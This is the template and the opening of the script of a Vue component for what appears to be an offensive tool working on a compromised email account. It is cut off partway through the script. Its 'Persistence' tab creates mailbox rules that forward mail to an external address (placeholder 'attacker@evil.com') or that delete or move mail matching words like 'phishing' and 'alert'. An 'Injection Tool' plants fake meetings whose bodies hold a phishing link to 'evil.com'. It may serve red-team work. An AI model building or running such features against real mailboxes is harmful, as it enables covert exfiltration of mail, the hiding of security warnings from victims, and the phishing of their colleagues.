<template>
  <div :class="['p-8 w-full', isDark ? 'bg-gray-900' : '']">
    <!-- Header -->
    <div class="flex items-center justify-between mb-8">
      <h1 :class="['text-3xl font-bold', isDark ? 'text-gray-100' : 'text-gray-800']">Emails</h1>
      <div class="flex space-x-4">
        <button @click="showCompose = true" class="btn btn-primary">
          ✉️ Compose
        </button>
        <button @click="refreshCurrentView" :class="['btn', isDark ? 'btn-secondary-dark' : 'btn-secondary']">
          🔄 Refresh
        </button>
      </div>
    </div>

    <!-- Folder Tabs -->
    <div :class="['mb-6 border-b pb-2', isDark ? 'border-gray-700' : 'border-gray-200']">
      <div class="flex flex-wrap gap-2 items-start">
        <!-- Common Folders with Subfolders -->
        <div v-for="folder in commonFolders" :key="folder.id" class="relative">
          <div class="flex items-center gap-1">
            <button
              @click="selectFolder(folder.id)"
              :class="[
                'px-4 py-2 rounded-t-lg font-semibold transition-colors',
                currentFolder === folder.id
                  ? isDark ? 'bg-blue-600 text-white' : 'bg-blue-600 text-white'
                  : isDark ? 'bg-gray-800 text-gray-300 hover:bg-gray-700' : 'bg-gray-100 text-gray-700 hover:bg-gray-200'
              ]"
            >
              {{ folder.icon }} {{ folder.name }}
              <span v-if="folder.count !== undefined" :class="['ml-2 text-xs px-2 py-0.5 rounded-full', currentFolder === folder.id ? 'bg-blue-700' : isDark ? 'bg-gray-700' : 'bg-gray-200']">
                {{ folder.count }}
              </span>
            </button>
            
            <!-- Expand/Collapse button for subfolders -->
            <button
              v-if="folder.children && folder.children.length > 0"
              @click="toggleFolder(folder.id)"
              :class="[
                'px-2 py-2 rounded-t-lg transition-colors text-sm',
                isDark ? 'bg-gray-800 text-gray-400 hover:bg-gray-700' : 'bg-gray-100 text-gray-600 hover:bg-gray-200'
              ]"
            >
              {{ expandedFolders[folder.id] ? '▼' : '▶' }}
            </button>
          </div>
          
          <!-- Subfolders Dropdown -->
          <div
            v-if="expandedFolders[folder.id] && folder.children && folder.children.length > 0"
            :class="[
              'absolute top-full left-0 mt-1 rounded-lg shadow-lg z-10 min-w-[200px]',
              isDark ? 'bg-gray-800 border border-gray-700' : 'bg-white border border-gray-200'
            ]"
          >
            <button
              v-for="child in folder.children"
              :key="child.id"
              @click="selectFolder(child.id)"
              :class="[
                'w-full text-left px-4 py-2 text-sm hover:bg-opacity-80 transition-colors border-b last:border-b-0',
                currentFolder === child.id
                  ? isDark ? 'bg-blue-700 text-white' : 'bg-blue-100 text-blue-800'
                  : isDark ? 'text-gray-300 hover:bg-gray-700 border-gray-700' : 'text-gray-700 hover:bg-gray-100 border-gray-200'
              ]"
            >
              📁 {{ child.displayName }}
              <span v-if="child.totalItemCount > 0" :class="['ml-2 text-xs', isDark ? 'text-gray-400' : 'text-gray-500']">
                ({{ child.totalItemCount }})
              </span>
            </button>
          </div>
        </div>
        
        <!-- NEW TABS: Rules & Calendar -->
        <button
          @click="selectFolder('rules')"
          :class="[
            'px-4 py-2 rounded-t-lg font-semibold transition-colors',
            currentFolder === 'rules'
              ? isDark ? 'bg-orange-600 text-white' : 'bg-orange-600 text-white'
              : isDark ? 'bg-gray-800 text-gray-300 hover:bg-gray-700' : 'bg-gray-100 text-gray-700 hover:bg-gray-200'
          ]"
        >
          ⚠️ Rules
        </button>
        
        <button
          @click="selectFolder('calendar')"
          :class="[
            'px-4 py-2 rounded-t-lg font-semibold transition-colors',
            currentFolder === 'calendar'
              ? isDark ? 'bg-green-600 text-white' : 'bg-green-600 text-white'
              : isDark ? 'bg-gray-800 text-gray-300 hover:bg-gray-700' : 'bg-gray-100 text-gray-700 hover:bg-gray-200'
          ]"
        >
          📅 Calendar
        </button>
      </div>
    </div>

    <!-- Search (only for email folders) -->
    <div v-if="currentFolder !== 'rules' && currentFolder !== 'calendar'" class="mb-6">
      <div class="flex space-x-2">
        <input
          v-model="searchQuery"
          @keyup.enter="searchEmails"
          type="text"
          placeholder="Search emails..."
          :class="[
            'flex-1 px-4 py-2 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent',
            isDark ? 'bg-gray-800 border-gray-600 text-gray-100 placeholder-gray-400' : 'border-gray-300'
          ]"
        />
        <button @click="searchEmails" :class="['btn', isDark ? 'btn-secondary-dark' : 'btn-secondary']">
          🔍 Search
        </button>
        <button v-if="isSearching" @click="clearSearch" :class="['btn', isDark ? 'btn-secondary-dark' : 'btn-secondary']">
          ✕ Clear
        </button>
      </div>
    </div>

    <!-- Loading -->
    <div v-if="loading" class="text-center py-12">
      <div class="animate-spin h-12 w-12 border-4 border-blue-500 border-t-transparent rounded-full mx-auto"></div>
      <p :class="['mt-4', isDark ? 'text-gray-400' : 'text-gray-500']">Loading...</p>
    </div>

    <!-- Error -->
    <div v-else-if="error" :class="['border rounded-lg p-6 text-center', isDark ? 'bg-red-900/30 border-red-800' : 'bg-red-50 border-red-200']">
      <p :class="['font-semibold', isDark ? 'text-red-400' : 'text-red-600']">{{ error }}</p>
      <button @click="refreshCurrentView" class="mt-4 btn btn-primary">Retry</button>
    </div>

    <!-- ========== EMAIL LIST (EXISTING) ========== -->
    <div v-else-if="currentFolder !== 'rules' && currentFolder !== 'calendar'">
      <!-- Empty -->
      <div v-if="emails.length === 0" :class="['text-center py-12 rounded-lg shadow-md', isDark ? 'bg-gray-800' : 'bg-white']">
        <div class="text-6xl mb-4">📭</div>
        <h2 :class="['text-2xl font-semibold mb-2', isDark ? 'text-gray-100' : 'text-gray-800']">No Emails</h2>
        <p :class="isDark ? 'text-gray-400' : 'text-gray-500'">{{ isSearching ? 'No results found' : 'This folder is empty' }}</p>
      </div>

      <!-- Email List -->
      <div v-else class="space-y-3">
        <EmailCard
          v-for="email in emails"
          :key="email.id"
          :email="email"
          :isDark="isDark"
          @open="openEmail"
        />
      </div>
    </div>

    <!-- ========== RULES TAB ========== -->
    <div v-else-if="currentFolder === 'rules'" :class="['rounded-lg shadow-md p-6', isDark ? 'bg-gray-800' : 'bg-white']">
      <h2 :class="['text-2xl font-bold mb-6', isDark ? 'text-gray-100' : 'text-gray-800']">⚠️ Mailbox Rules (Persistence)</h2>
      
      <!-- Rules List -->
      <div class="mb-8">
        <h3 :class="['text-xl font-semibold mb-4', isDark ? 'text-gray-200' : 'text-gray-700']">Existing Rules</h3>
        
        <div v-if="rules.length === 0" :class="['text-center py-8 rounded border', isDark ? 'bg-gray-700 border-gray-600 text-gray-400' : 'bg-gray-50 border-gray-200 text-gray-500']">
          No mailbox rules found
        </div>
        
        <div v-else class="overflow-x-auto">
          <table class="w-full">
            <thead :class="isDark ? 'bg-gray-700' : 'bg-gray-100'">
              <tr>
                <th :class="['px-4 py-3 text-left', isDark ? 'text-gray-300' : 'text-gray-700']">Name</th>
                <th :class="['px-4 py-3 text-left', isDark ? 'text-gray-300' : 'text-gray-700']">Type</th>
                <th :class="['px-4 py-3 text-left', isDark ? 'text-gray-300' : 'text-gray-700']">Details</th>
                <th :class="['px-4 py-3 text-left', isDark ? 'text-gray-300' : 'text-gray-700']">Status</th>
                <th :class="['px-4 py-3 text-left', isDark ? 'text-gray-300' : 'text-gray-700']">Actions</th>
              </tr>
            </thead>
            <tbody>
              <tr v-for="rule in rules" :key="rule.id" :class="['border-b', isDark ? 'border-gray-700' : 'border-gray-200']">
                <td :class="['px-4 py-3', isDark ? 'text-gray-300' : 'text-gray-700']">{{ rule.displayName }}</td>
                <td class="px-4 py-3">
                  <span v-if="rule.actions.forwardTo" class="px-2 py-1 rounded text-xs font-semibold bg-red-600 text-white">🔴 Forward</span>
                  <span v-else-if="rule.actions.delete" class="px-2 py-1 rounded text-xs font-semibold bg-orange-600 text-white">🟠 Delete</span>
                  <span v-else-if="rule.actions.moveToFolder" class="px-2 py-1 rounded text-xs font-semibold bg-yellow-600 text-white">🟡 Move</span>
                  <span v-else class="px-2 py-1 rounded text-xs font-semibold bg-gray-600 text-white">Other</span>
                </td>
                <td :class="['px-4 py-3 text-sm', isDark ? 'text-gray-400' : 'text-gray-600']">
                  <span v-if="rule.actions.forwardTo">→ {{ rule.actions.forwardTo[0]?.emailAddress?.address }}</span>
                  <span v-else-if="rule.conditions.subjectContains">Keywords: {{ rule.conditions.subjectContains.join(', ') }}</span>
                  <span v-else>-</span>
                </td>
                <td class="px-4 py-3">
                  <span v-if="rule.isEnabled" class="px-2 py-1 rounded text-xs bg-green-600 text-white">✓ Enabled</span>
                  <span v-else class="px-2 py-1 rounded text-xs bg-gray-600 text-white">Disabled</span>
                </td>
                <td class="px-4 py-3">
                  <button @click="deleteRule(rule.id)" class="px-3 py-1 rounded text-sm bg-red-600 text-white hover:bg-red-700">
                    🗑️ Delete
                  </button>
                </td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>

      <!-- Create Rule Form -->
      <div :class="['border-t pt-6', isDark ? 'border-gray-700' : 'border-gray-200']">
        <h3 :class="['text-xl font-semibold mb-4', isDark ? 'text-gray-200' : 'text-gray-700']">Create New Rule</h3>
        
        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div>
            <label :class="['block mb-2 font-semibold', isDark ? 'text-gray-300' : 'text-gray-700']">Rule Type</label>
            <select v-model="newRule.ruleType" :class="['w-full px-4 py-2 border rounded-lg', isDark ? 'bg-gray-700 border-gray-600 text-gray-100' : 'border-gray-300']">
              <option value="forward">Forward (to external email)</option>
              <option value="delete">Delete (by keywords)</option>
              <option value="move">Move (to folder)</option>
            </select>
          </div>
          
          <div>
            <label :class="['block mb-2 font-semibold', isDark ? 'text-gray-300' : 'text-gray-700']">Display Name</label>
            <input v-model="newRule.displayName" type="text" placeholder="Archive Old Items" :class="['w-full px-4 py-2 border rounded-lg', isDark ? 'bg-gray-700 border-gray-600 text-gray-100 placeholder-gray-500' : 'border-gray-300']" />
          </div>
          
          <div v-if="newRule.ruleType === 'forward'">
            <label :class="['block mb-2 font-semibold', isDark ? 'text-gray-300' : 'text-gray-700']">Forward To (email)</label>
            <input v-model="newRule.forwardTo" type="email" placeholder="attacker@evil.com" :class="['w-full px-4 py-2 border rounded-lg', isDark ? 'bg-gray-700 border-gray-600 text-gray-100 placeholder-gray-500' : 'border-gray-300']" />
          </div>
          
          <div v-if="newRule.ruleType === 'delete' || newRule.ruleType === 'move'">
            <label :class="['block mb-2 font-semibold', isDark ? 'text-gray-300' : 'text-gray-700']">Keywords (comma separated)</label>
            <input v-model="newRule.keywordsStr" type="text" placeholder="phishing, suspicious, alert" :class="['w-full px-4 py-2 border rounded-lg', isDark ? 'bg-gray-700 border-gray-600 text-gray-100 placeholder-gray-500' : 'border-gray-300']" />
          </div>
          
          <div v-if="newRule.ruleType === 'move'">
            <label :class="['block mb-2 font-semibold', isDark ? 'text-gray-300' : 'text-gray-700']">Move To Folder</label>
            <select v-model="newRule.moveToFolder" :class="['w-full px-4 py-2 border rounded-lg', isDark ? 'bg-gray-700 border-gray-600 text-gray-100' : 'border-gray-300']">
              <option value="">-- Select Folder --</option>
              <option v-for="folder in allFoldersFlat" :key="folder.id" :value="folder.id">
                {{ folder.displayPath }}
              </option>
            </select>
          </div>
        </div>
        
        <div class="mt-4 flex space-x-4">
          <button @click="createRule" :disabled="creatingRule" class="btn btn-primary">
            {{ creatingRule ? 'Creating...' : '✅ Create Rule' }}
          </button>
          <button v-if="rules.length > 0" @click="deleteAllRules" class="btn bg-red-600 text-white hover:bg-red-700">
            🗑️ Delete All Rules
          </button>
        </div>
      </div>
    </div>

    <!-- ========== CALENDAR TAB ========== -->
    <div v-else-if="currentFolder === 'calendar'" :class="['rounded-lg shadow-md p-6', isDark ? 'bg-gray-800' : 'bg-white']">
      <h2 :class="['text-2xl font-bold mb-6', isDark ? 'text-gray-100' : 'text-gray-800']">📅 Calendar & Injection</h2>
      
      <!-- Sub-tabs for Calendar View and Injection Tool -->
      <div class="flex space-x-2 mb-6 border-b" :class="isDark ? 'border-gray-700' : 'border-gray-200'">
        <button
          @click="calendarSubTab = 'view'"
          :class="[
            'px-4 py-2 font-semibold transition-colors border-b-2',
            calendarSubTab === 'view'
              ? (isDark ? 'border-blue-500 text-blue-400' : 'border-blue-500 text-blue-600')
              : (isDark ? 'border-transparent text-gray-400 hover:text-gray-300' : 'border-transparent text-gray-600 hover:text-gray-800')
          ]"
        >
          📅 Calendar View
        </button>
        <button
          @click="calendarSubTab = 'injection'"
          :class="[
            'px-4 py-2 font-semibold transition-colors border-b-2',
            calendarSubTab === 'injection'
              ? (isDark ? 'border-red-500 text-red-400' : 'border-red-500 text-red-600')
              : (isDark ? 'border-transparent text-gray-400 hover:text-gray-300' : 'border-transparent text-gray-600 hover:text-gray-800')
          ]"
        >
          💉 Injection Tool
        </button>
      </div>

      <!-- TAB 1: Calendar View -->
      <div v-if="calendarSubTab === 'view'">
        <!-- Calendar Header -->
        <div class="flex items-center justify-between mb-4">
          <button
            @click="changeMonth(-1)"
            :class="['px-3 py-1 rounded', isDark ? 'bg-gray-700 hover:bg-gray-600 text-gray-300' : 'bg-gray-200 hover:bg-gray-300 text-gray-700']"
          >
            ← Prev
          </button>
          <h3 :class="['text-xl font-semibold', isDark ? 'text-gray-100' : 'text-gray-800']">
            {{ currentMonthName }} {{ currentYear }}
          </h3>
          <button
            @click="changeMonth(1)"
            :class="['px-3 py-1 rounded', isDark ? 'bg-gray-700 hover:bg-gray-600 text-gray-300' : 'bg-gray-200 hover:bg-gray-300 text-gray-700']"
          >
            Next →
          </button>
        </div>

        <!-- Calendar Grid -->
        <div class="mb-6">
          <!-- Days of Week Header -->
          <div class="grid grid-cols-7 gap-2 mb-2">
            <div v-for="day in ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun']" :key="day" 
                 :class="['text-center font-semibold py-2', isDark ? 'text-gray-400' : 'text-gray-600']">
              {{ day }}
            </div>
          </div>

          <!-- Calendar Days -->
          <div class="grid grid-cols-7 gap-2">
            <div
              v-for="day in calendarDays"
              :key="day.date"
              :class="[
                'min-h-[80px] p-2 rounded border cursor-pointer transition-colors',
                day.isCurrentMonth
                  ? (isDark ? 'bg-gray-700 border-gray-600 hover:bg-gray-600' : 'bg-white border-gray-300 hover:bg-gray-50')
                  : (isDark ? 'bg-gray-800 border-gray-700 text-gray-600' : 'bg-gray-100 border-gray-200 text-gray-400'),
                day.isToday ? 'ring-2 ring-blue-500' : ''
              ]"
              @click="selectDay(day)"
            >
              <div :class="['text-sm font-semibold mb-1', day.isToday ? 'text-blue-500' : '']">
                {{ day.dayNumber }}
              </div>
              <div class="space-y-1">
                <div
                  v-for="event in day.events.slice(0, 2)"
                  :key="event.id"
                  :class="[
                    'text-xs px-1 py-0.5 rounded truncate cursor-pointer hover:opacity-80 transition-opacity',
                    isEventInjected(event.id)
                      ? (isDark ? 'bg-red-900 text-red-200' : 'bg-red-100 text-red-800')
                      : (isDark ? 'bg-blue-900 text-blue-200' : 'bg-blue-100 text-blue-800')
                  ]"
                  :title="event.subject + ' (click to view details)'"
                  @click.stop="viewEventDetails(event)"
                >
                  {{ event.subject }}
                </div>
                <div v-if="day.events.length > 2" class="text-xs text-gray-500">
                  +{{ day.events.length - 2 }} more
                </div>
              </div>
            </div>
          </div>
        </div>

        <!-- Events List for Selected Day -->
        <div v-if="selectedDay" :class="['border-t pt-4', isDark ? 'border-gray-700' : 'border-gray-200']">
          <h4 :class="['text-lg font-semibold mb-3', isDark ? 'text-gray-200' : 'text-gray-700']">
            Events on {{ selectedDay.date.toLocaleDateString() }}
          </h4>
          
          <div v-if="selectedDay.events.length === 0" :class="['text-center py-4 text-sm', isDark ? 'text-gray-400' : 'text-gray-500']">
            No events on this day
          </div>
          
          <div v-else class="space-y-2">
            <div
              v-for="event in selectedDay.events"
              :key="event.id"
              :class="[
                'p-3 rounded border',
                isDark ? 'bg-gray-700 border-gray-600' : 'bg-gray-50 border-gray-200'
              ]"
            >
              <div class="flex items-start justify-between">
                <div class="flex-1">
                  <div class="flex items-center space-x-2 mb-1">
                    <span :class="['font-semibold', isDark ? 'text-gray-100' : 'text-gray-800']">
                      {{ event.subject }}
                    </span>
                    <span
                      v-if="isEventInjected(event.id)"
                      class="px-2 py-0.5 rounded text-xs bg-red-600 text-white"
                    >
                      🔴 Injected
                    </span>
                  </div>
                  <div :class="['text-sm space-y-1', isDark ? 'text-gray-400' : 'text-gray-600']">
                    <div>⏰ {{ formatDateTime(event.start) }} - {{ formatDateTime(event.end) }}</div>
                    <div v-if="event.location">📍 {{ event.location }}</div>
                    <div v-if="event.organizer">👤 {{ event.organizer }}</div>
                    <div v-if="event.attendees && event.attendees.length > 0">
                      👥 {{ event.attendees.length }} attendees
                    </div>
                  </div>
                </div>
                <div class="flex space-x-2">
                  <button
                    @click="viewEventDetails(event)"
                    :class="[
                      'px-3 py-1 rounded text-sm font-semibold',
                      isDark ? 'bg-blue-600 text-white hover:bg-blue-700' : 'bg-blue-500 text-white hover:bg-blue-600'
                    ]"
                  >
                    👁️ View Details
                  </button>
                  <button
                    v-if="isEventInjected(event.id)"
                    @click="deleteEvent(event.id)"
                    class="px-3 py-1 rounded text-sm bg-red-600 text-white hover:bg-red-700 font-semibold"
                  >
                    🗑️ Delete
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <!-- TAB 2: Injection Tool -->
      <div v-else-if="calendarSubTab === 'injection'">
        <!-- Injected Events Tracker -->
        <div class="mb-8">
          <h3 :class="['text-xl font-semibold mb-4', isDark ? 'text-gray-200' : 'text-gray-700']">
            📋 Injected Events Tracker
            <span :class="['ml-2 text-sm font-normal', isDark ? 'text-gray-400' : 'text-gray-500']">
              ({{ injectedEvents.length }} events)
            </span>
          </h3>

          <div v-if="injectedEvents.length === 0" :class="['text-center py-8 rounded border', isDark ? 'bg-gray-700 border-gray-600 text-gray-400' : 'bg-gray-50 border-gray-200 text-gray-500']">
            No injected events yet. Create one below.
          </div>

          <div v-else class="overflow-x-auto">
            <table class="w-full">
              <thead :class="isDark ? 'bg-gray-700' : 'bg-gray-100'">
                <tr>
                  <th :class="['px-4 py-3 text-left', isDark ? 'text-gray-300' : 'text-gray-700']">Subject</th>
                  <th :class="['px-4 py-3 text-left', isDark ? 'text-gray-300' : 'text-gray-700']">Start</th>
                  <th :class="['px-4 py-3 text-left', isDark ? 'text-gray-300' : 'text-gray-700']">Location</th>
                  <th :class="['px-4 py-3 text-left', isDark ? 'text-gray-300' : 'text-gray-700']">Attendees</th>
                  <th :class="['px-4 py-3 text-left', isDark ? 'text-gray-300' : 'text-gray-700']">Actions</th>
                </tr>
              </thead>
              <tbody>
                <tr v-for="event in injectedEvents" :key="event.id" :class="['border-b', isDark ? 'border-gray-700' : 'border-gray-200']">
                  <td :class="['px-4 py-3', isDark ? 'text-gray-300' : 'text-gray-700']">
                    {{ event.subject }}
                  </td>
                  <td :class="['px-4 py-3 text-sm', isDark ? 'text-gray-400' : 'text-gray-600']">
                    {{ formatDateTime(event.start) }}
                  </td>
                  <td :class="['px-4 py-3 text-sm', isDark ? 'text-gray-400' : 'text-gray-600']">
                    {{ event.location || '-' }}
                  </td>
                  <td :class="['px-4 py-3 text-sm', isDark ? 'text-gray-400' : 'text-gray-600']">
                    {{ event.attendees?.length || 0 }} attendees
                  </td>
                  <td class="px-4 py-3">
                    <button
                      @click="deleteEvent(event.id)"
                      class="px-3 py-1 rounded text-sm bg-red-600 text-white hover:bg-red-700"
                    >
                      🗑️ Delete
                    </button>
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>

        <!-- Create Event Form -->
        <div :class="['border-t pt-6', isDark ? 'border-gray-700' : 'border-gray-200']">
          <h3 :class="['text-xl font-semibold mb-4', isDark ? 'text-gray-200' : 'text-gray-700']">💉 Inject Fake Meeting (Persistence)</h3>
          
          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <label :class="['block mb-2 font-semibold', isDark ? 'text-gray-300' : 'text-gray-700']">Subject *</label>
              <input v-model="newEvent.subject" type="text" placeholder="Mandatory Security Training" :class="['w-full px-4 py-2 border rounded-lg', isDark ? 'bg-gray-700 border-gray-600 text-gray-100 placeholder-gray-500' : 'border-gray-300']" />
            </div>
            
            <div>
              <label :class="['block mb-2 font-semibold', isDark ? 'text-gray-300' : 'text-gray-700']">Location</label>
              <input v-model="newEvent.location" type="text" placeholder="Conference Room A" :class="['w-full px-4 py-2 border rounded-lg', isDark ? 'bg-gray-700 border-gray-600 text-gray-100 placeholder-gray-500' : 'border-gray-300']" />
            </div>
            
            <div>
              <label :class="['block mb-2 font-semibold', isDark ? 'text-gray-300' : 'text-gray-700']">Start DateTime *</label>
              <input v-model="newEvent.start" type="datetime-local" :class="['w-full px-4 py-2 border rounded-lg', isDark ? 'bg-gray-700 border-gray-600 text-gray-100' : 'border-gray-300']" />
            </div>
            
            <div>
              <label :class="['block mb-2 font-semibold', isDark ? 'text-gray-300' : 'text-gray-700']">End DateTime *</label>
              <input v-model="newEvent.end" type="datetime-local" :class="['w-full px-4 py-2 border rounded-lg', isDark ? 'bg-gray-700 border-gray-600 text-gray-100' : 'border-gray-300']" />
            </div>
            
            <div class="md:col-span-2">
              <label :class="['block mb-2 font-semibold', isDark ? 'text-gray-300' : 'text-gray-700']">Body (with evil link)</label>
              <textarea v-model="newEvent.body" rows="3" placeholder="Click here for mandatory training: https://evil.com/phishing" :class="['w-full px-4 py-2 border rounded-lg', isDark ? 'bg-gray-700 border-gray-600 text-gray-100 placeholder-gray-500' : 'border-gray-300']"></textarea>
            </div>
            
            <div class="md:col-span-2">
              <label :class="['block mb-2 font-semibold', isDark ? 'text-gray-300' : 'text-gray-700']">Attendees (comma separated emails)</label>
              <input v-model="newEvent.attendeesStr" type="text" placeholder="user1@domain.com, user2@domain.com" :class="['w-full px-4 py-2 border rounded-lg', isDark ? 'bg-gray-700 border-gray-600 text-gray-100 placeholder-gray-500' : 'border-gray-300']" />
            </div>
          </div>
          
          <div class="mt-4">
            <button @click="createEvent" :disabled="creatingEvent" class="btn btn-primary">
              {{ creatingEvent ? 'Creating...' : '✅ Inject Meeting' }}
            </button>
          </div>
        </div>
      </div>
    </div>

    <!-- Compose Modal (EXISTING - NOT TOUCHED) -->
    <div v-if="showCompose" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
      <div :class="['rounded-lg shadow-xl w-full max-w-4xl max-h-[95vh] overflow-y-auto', isDark ? 'bg-gray-800' : 'bg-white']">
        <div class="p-6">
          <div class="flex items-center justify-between mb-6">
            <h2 :class="['text-2xl font-bold', isDark ? 'text-gray-100' : 'text-gray-800']">Compose Email</h2>
            <button @click="closeCompose" :class="['text-2xl', isDark ? 'text-gray-400 hover:text-gray-200' : 'text-gray-400 hover:text-gray-600']">
              ✕
            </button>
          </div>

          <div class="space-y-4">
            <div>
              <label :class="['block mb-2 font-semibold', isDark ? 'text-gray-300' : 'text-gray-700']">To</label>
              <input
                v-model="composeData.to"
                type="email"
                placeholder="recipient@example.com"
                :class="[
                  'w-full px-4 py-2 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent',
                  isDark ? 'bg-gray-700 border-gray-600 text-gray-100 placeholder-gray-500' : 'border-gray-300'
                ]"
              />
            </div>

            <div>
              <label :class="['block mb-2 font-semibold', isDark ? 'text-gray-300' : 'text-gray-700']">Subject</label>
              <input
                v-model="composeData.subject"
                type="text"
                placeholder="Email subject"
                :class="[
                  'w-full px-4 py-2 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent',
                  isDark ? 'bg-gray-700 border-gray-600 text-gray-100 placeholder-gray-500' : 'border-gray-300'
                ]"
              />
            </div>

            <div>
              <label :class="['block mb-2 font-semibold', isDark ? 'text-gray-300' : 'text-gray-700']">Message</label>
              <HTMLEditor
                v-model="composeData.body"
                :isDark="isDark"
                placeholder="Write your message..."
              />
            </div>

            <div v-if="sendError" :class="['p-4 rounded-lg', isDark ? 'bg-red-900/30 text-red-400' : 'bg-red-50 text-red-600']">
              {{ sendError }}
            </div>

            <div v-if="sendSuccess" :class="['p-4 rounded-lg', isDark ? 'bg-green-900/30 text-green-400' : 'bg-green-50 text-green-600']">
              ✅ Email sent successfully!
            </div>

            <div class="flex justify-end space-x-4">
              <button @click="sendEmail" :disabled="sending" class="btn btn-primary">
                {{ sending ? 'Sending...' : '📤 Send' }}
              </button>
              <button @click="closeCompose" :class="['btn', isDark ? 'btn-secondary-dark' : 'btn-secondary']">
                Cancel
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Event Body Modal (NEW) -->
    <div v-if="selectedEvent" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
      <div :class="['rounded-lg shadow-xl w-full max-w-4xl max-h-[95vh] overflow-y-auto', isDark ? 'bg-gray-800' : 'bg-white']">
        <div class="p-6">
          <div class="flex items-center justify-between mb-6">
            <div class="flex items-center space-x-3">
              <h2 :class="['text-2xl font-bold', isDark ? 'text-gray-100' : 'text-gray-800']">Event Details</h2>
              <span
                v-if="isEventInjected(selectedEvent.id)"
                class="px-3 py-1 rounded text-sm bg-red-600 text-white"
              >
                🔴 Injected Event
              </span>
              <span
                v-else
                class="px-3 py-1 rounded text-sm bg-blue-600 text-white"
              >
                🔵 Real Event
              </span>
            </div>
            <button @click="selectedEvent = null" :class="['text-2xl', isDark ? 'text-gray-400 hover:text-gray-200' : 'text-gray-400 hover:text-gray-600']">
              ✕
            </button>
          </div>

          <div class="space-y-4">
            <div>
              <label :class="['block mb-2 font-semibold', isDark ? 'text-gray-300' : 'text-gray-700']">Subject</label>
              <p :class="['px-4 py-2 rounded border', isDark ? 'bg-gray-700 border-gray-600 text-gray-100' : 'bg-gray-50 border-gray-300']">
                {{ selectedEvent.subject }}
              </p>
            </div>

            <div class="grid grid-cols-2 gap-4">
              <div>
                <label :class="['block mb-2 font-semibold', isDark ? 'text-gray-300' : 'text-gray-700']">Start</label>
                <p :class="['px-4 py-2 rounded border', isDark ? 'bg-gray-700 border-gray-600 text-gray-100' : 'bg-gray-50 border-gray-300']">
                  {{ formatDateTime(selectedEvent.start) }}
                </p>
              </div>
              <div>
                <label :class="['block mb-2 font-semibold', isDark ? 'text-gray-300' : 'text-gray-700']">End</label>
                <p :class="['px-4 py-2 rounded border', isDark ? 'bg-gray-700 border-gray-600 text-gray-100' : 'bg-gray-50 border-gray-300']">
                  {{ formatDateTime(selectedEvent.end) }}
                </p>
              </div>
            </div>

            <div class="grid grid-cols-2 gap-4">
              <div>
                <label :class="['block mb-2 font-semibold', isDark ? 'text-gray-300' : 'text-gray-700']">Location</label>
                <p :class="['px-4 py-2 rounded border', isDark ? 'bg-gray-700 border-gray-600 text-gray-100' : 'bg-gray-50 border-gray-300']">
                  {{ selectedEvent.location || 'No location' }}
                </p>
              </div>
              <div>
                <label :class="['block mb-2 font-semibold', isDark ? 'text-gray-300' : 'text-gray-700']">Organizer</label>
                <p :class="['px-4 py-2 rounded border', isDark ? 'bg-gray-700 border-gray-600 text-gray-100' : 'bg-gray-50 border-gray-300']">
                  {{ selectedEvent.organizer || 'N/A' }}
                </p>
              </div>
            </div>

            <div>
              <label :class="['block mb-2 font-semibold', isDark ? 'text-gray-300' : 'text-gray-700']">Body Content</label>
              <div 
                v-if="selectedEvent.body"
                :class="['event-body-content px-4 py-3 rounded border max-h-96 overflow-y-auto', isDark ? 'bg-gray-700 border-gray-600 text-gray-100' : 'bg-gray-50 border-gray-300']"
                v-html="selectedEvent.body"
              ></div>
              <p v-else :class="['px-4 py-2 rounded border text-center', isDark ? 'bg-gray-700 border-gray-600 text-gray-400' : 'bg-gray-50 border-gray-300 text-gray-500']">
                No body content
              </p>
            </div>

            <div>
              <label :class="['block mb-2 font-semibold', isDark ? 'text-gray-300' : 'text-gray-700']">
                Attendees ({{ selectedEvent.attendees && selectedEvent.attendees.length > 0 ? selectedEvent.attendees.length : 0 }})
              </label>
              <div 
                v-if="selectedEvent.attendees && selectedEvent.attendees.length > 0"
                :class="['px-4 py-3 rounded border', isDark ? 'bg-gray-700 border-gray-600 text-gray-100' : 'bg-gray-50 border-gray-300']"
              >
                <ul class="space-y-1">
                  <li v-for="(attendee, index) in selectedEvent.attendees" :key="index" class="flex items-center space-x-2">
                    <span class="text-blue-500">•</span>
                    <span>{{ attendee }}</span>
                  </li>
                </ul>
              </div>
              <p v-else :class="['px-4 py-2 rounded border text-center', isDark ? 'bg-gray-700 border-gray-600 text-gray-400' : 'bg-gray-50 border-gray-300 text-gray-500']">
                No attendees
              </p>
            </div>

            <div class="flex justify-end space-x-2">
              <button
                v-if="isEventInjected(selectedEvent.id)"
                @click="deleteEventFromModal(selectedEvent.id)"
                class="px-4 py-2 rounded bg-red-600 text-white hover:bg-red-700 font-semibold"
              >
                🗑️ Delete Event
              </button>
              <button @click="selectedEvent = null" :class="['btn', isDark ? 'btn-secondary-dark' : 'btn-secondary']">
                Close
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, computed, onMounted, onActivated } from 'vue'
import { useRouter } from 'vue-router'
import EmailCard from '../components/EmailCard.vue'
import HTMLEditor from '../components/HTMLEditor.vue'

const props = defineProps({
  isDark: {
    type: Boolean,
    default: false
  }
})

const router = useRouter()

// ===== EXISTING DATA =====
const emails = ref([])
const loading = ref(false)
const error = ref(null)
const searchQuery = ref('')
const isSearching = ref(false)

const showCompose = ref(false)
const sending = ref(false)
const sendError = ref(null)
const sendSuccess = ref(false)
const composeData = ref({
  to: '',
  subject: '',
  body: ''
})

// Folder management
const currentFolder = ref('inbox')
const allFolders = ref([])
const allFoldersFlat = ref([]) // Flat list for dropdown
const expandedFolders = ref({}) // Track which folders are expanded
const commonFolders = ref([
  { id: 'inbox', name: 'Inbox', icon: '📥', count: 0, children: [] },
